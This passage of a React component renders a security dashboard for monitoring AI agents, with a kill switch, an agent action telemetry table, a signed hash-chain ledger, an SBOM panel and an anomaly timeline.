            <p className="text-[#A3A3A3] text-sm mt-1 uppercase tracking-wider font-semibold">Enterprise Operations • Confirmed Stream</p>
          </div>
          <button 
            onClick={handleKillSwitch}
            className={`px-6 py-2.5 rounded-lg font-bold text-sm transition-all duration-300 shadow-lg ${
              killSwitchActive 
                ? 'bg-red-600 text-white animate-pulse shadow-red-500/50' 
                : 'bg-[#D97706] hover:bg-[#B45309] text-white shadow-[#D97706]/20'
            }`}
          >
            {killSwitchActive ? '⚠️ NETWORK ISOLATED' : 'GLOBAL KILL SWITCH'}
          </button>
        </header>

        {/* Navigation */}
        <div className="flex gap-4">
          <button onClick={() => setActiveTab('telemetry')} className={`px-6 py-3 rounded-lg font-medium transition-all ${activeTab === 'telemetry' ? 'bg-[#1E1E1E] text-white border border-[#D97706]/30 shadow-md' : 'bg-[#121212] hover:bg-[#1E1E1E] text-gray-400 border border-transparent'}`}>Live Confirmed Stream</button>
          <button onClick={() => setActiveTab('ledger')} className={`px-6 py-3 rounded-lg font-medium transition-all ${activeTab === 'ledger' ? 'bg-[#1E1E1E] text-white border border-[#D97706]/30 shadow-md' : 'bg-[#121212] hover:bg-[#1E1E1E] text-gray-400 border border-transparent'}`}>Cryptographic Ledger</button>
          <button onClick={() => setActiveTab('supply_chain')} className={`px-6 py-3 rounded-lg font-medium transition-all ${activeTab === 'supply_chain' ? 'bg-[#1E1E1E] text-white border border-[#D97706]/30 shadow-md' : 'bg-[#121212] hover:bg-[#1E1E1E] text-gray-400 border border-transparent'}`}>SBOM & Supply Chain</button>
          <button onClick={() => setActiveTab('anomaly')} className={`px-6 py-3 rounded-lg font-medium transition-all ${activeTab === 'anomaly' ? 'bg-[#1E1E1E] text-white border border-[#D97706]/30 shadow-md' : 'bg-[#121212] hover:bg-[#1E1E1E] text-gray-400 border border-transparent'}`}>Anomaly Timeline</button>
        </div>

        {/* Content */}
        <main className="bg-[#1E1E1E] rounded-2xl shadow-xl border border-white/5 overflow-hidden">
          
          {activeTab === 'telemetry' && (
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="bg-[#121212] text-xs uppercase text-gray-500 border-b border-white/10">
                    <th className="p-4 font-semibold">Timestamp</th>
                    <th className="p-4 font-semibold">Agent ID</th>
                    <th className="p-4 font-semibold">Action</th>
                    <th className="p-4 font-semibold">Status</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5">
                  {events.length === 0 && (
                    <tr><td colSpan={4} className="p-8 text-center text-gray-500">Waiting for agent telemetry stream...</td></tr>
                  )}
                  {events.map((e, i) => (
                    <tr key={i} className="hover:bg-white/[0.02] transition-colors">
                      <td className="p-4 text-sm text-gray-400 font-mono">{new Date(e.timestamp).toLocaleTimeString()}</td>
                      <td className="p-4 text-sm font-semibold text-gray-300">{e.agent_id}</td>
                      <td className="p-4 text-sm text-gray-400">{e.action}</td>
                      <td className="p-4 text-sm">
                        <span className={`px-3 py-1 rounded-full text-xs font-bold border ${
                          e.status === 'ALLOW' ? 'bg-green-500/10 text-green-400 border-green-500/20' : 
                          e.status === 'BLOCK' ? 'bg-red-500/10 text-red-400 border-red-500/20' : 
                          'bg-yellow-500/10 text-yellow-400 border-yellow-500/20'
                        }`}>
                          {e.status}
                        </span>
                        {e.reason && <div className="text-xs text-gray-500 mt-1 max-w-xs truncate">{e.reason}</div>}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}

          {activeTab === 'ledger' && (
            <div className="p-6">
              
              <div className="flex justify-between items-start mb-6">
                <div className="flex items-center gap-3 bg-green-500/10 text-green-400 p-4 rounded-xl border border-green-500/20">
                  <div className="w-3 h-3 rounded-full bg-green-500 animate-pulse"></div>
                  <span className="font-bold">Chain Intact (SQLite)</span>
                  <span className="text-sm opacity-80 ml-auto">Verified via Ed25519 signatures</span>
                </div>
                
                <div className="flex flex-col items-end gap-3">
                  <button 
                    onClick={handleDownloadReport}
                    className="bg-[#D97706]/20 hover:bg-[#D97706]/40 text-[#D97706] font-bold py-2 px-4 rounded border border-[#D97706]/50 transition-colors"
                  >
                    ⬇️ Download Audit Report
                  </button>
                  
                  <div className="relative">
                  </div>
                </div>
              </div>

              <div className="space-y-4">
                {events.filter(e => e.proof).map((e, i) => (
                  <div key={i} className="bg-[#121212] p-4 rounded-xl border border-white/5 text-sm grid grid-cols-12 gap-4 items-center">
                    <div className="col-span-2 text-gray-500 font-mono text-xs">{new Date(e.timestamp).toISOString().split('T')[1]}</div>
                    <div className="col-span-2 font-bold text-gray-300">{e.action}</div>
                    <div className="col-span-8 space-y-2">
                      <div className="flex justify-between">
                        <span className="text-gray-500 text-xs uppercase tracking-wider">Proof</span>
                        <span className="font-mono text-xs text-[#D97706] truncate ml-4 bg-[#D97706]/10 px-2 rounded">{e.proof}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-500 text-xs uppercase tracking-wider">Prev Hash</span>
                        <span className="font-mono text-xs text-gray-400 truncate ml-4 bg-white/5 px-2 rounded">{e.prev_hash || 'GENESIS'}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {activeTab === 'supply_chain' && (
            <div className="p-6 space-y-4">
              <h2 className="text-xl font-semibold mb-4 text-white">SBOM & Supply Chain Status</h2>
              <div className="grid grid-cols-2 gap-6">
                <div className="bg-[#121212] p-5 rounded-xl border border-white/5 shadow-sm hover:border-[#D97706]/30 transition-colors">
                  <h3 className="font-bold text-white mb-2 flex items-center gap-2">
                    <div className="w-2 h-2 rounded-full bg-green-500"></div> atp-core (Python SDK)
                  </h3>
                  <p className="text-sm text-gray-400 mb-2">Hash Verification: <span className="font-mono text-green-400 bg-green-500/10 px-2 rounded border border-green-500/20">Verified via requirements.txt</span></p>
                  <p className="text-sm text-gray-500">Runtime imports pinned to SHA256 hashes.</p>
                </div>
                <div className="bg-[#121212] p-5 rounded-xl border border-white/5 shadow-sm hover:border-[#D97706]/30 transition-colors">
                  <h3 className="font-bold text-white mb-2 flex items-center gap-2">
                    <div className="w-2 h-2 rounded-full bg-green-500"></div> Go L7 Proxy Engine
                  </h3>
                  <p className="text-sm text-gray-400 mb-2">SBOM: <span className="font-mono text-[#D97706] bg-[#D97706]/10 px-2 rounded border border-[#D97706]/20">sbom.cdx.json</span></p>
                  <p className="text-sm text-gray-500">Dependencies: modernc.org/sqlite, goproxy</p>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'anomaly' && (
            <div className="p-6 space-y-4">
              <h2 className="text-xl font-semibold mb-4 text-white">Behavioral Anomaly & Taint Timeline</h2>
              <div className="space-y-4">
                {events.filter(e => e.status === 'BLOCK' || e.status === 'ESCALATE' || e.reason?.includes('Taint')).length === 0 && (
                  <div className="text-center p-8 border border-dashed border-white/10 rounded-xl">
                    <p className="text-gray-500 italic">No anomalies or tainted events detected in this session.</p>
                  </div>
                )}
                {events.filter(e => e.status === 'BLOCK' || e.status === 'ESCALATE' || e.reason?.includes('Taint')).map((e, i) => (
                  <div key={i} className="bg-red-500/5 p-4 rounded-xl border border-red-500/20 shadow-sm relative pl-10">
                    <div className="absolute left-4 top-0 bottom-0 w-px bg-red-500/20" />
                    <div className="absolute left-[11px] top-6 w-3 h-3 rounded-full bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.5)]" />
                    <div className="grid grid-cols-12 gap-4">
                      <div className="col-span-3 text-red-400/60 font-mono text-sm">{new Date(e.timestamp).toLocaleTimeString()}</div>
                      <div className="col-span-9">
                        <div className="font-bold text-red-400">Agent: {e.agent_id}</div>
                        <div className="text-sm text-red-300/80 mt-1 font-semibold">{e.reason}</div>
                        <div className="text-xs text-red-400 mt-2 bg-red-500/10 border border-red-500/20 inline-block px-2 py-1 rounded">Action: {e.action} | Status: {e.status}</div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

        </main>
      </div>
    </div>
  );
}
